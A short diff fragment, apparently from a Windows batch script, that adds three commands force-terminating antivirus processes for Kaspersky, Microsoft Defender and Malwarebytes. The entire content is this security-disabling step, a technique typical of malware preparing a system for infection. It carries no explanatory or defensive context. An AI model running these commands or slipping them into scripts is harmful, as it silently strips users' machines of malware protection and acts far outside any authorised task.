@@ -1,0 +1,4 @@
+taskkill /f /im avp.exe
+taskkill /f /im MsMpEng.exe
+taskkill /f /im mbamservice.exe
+
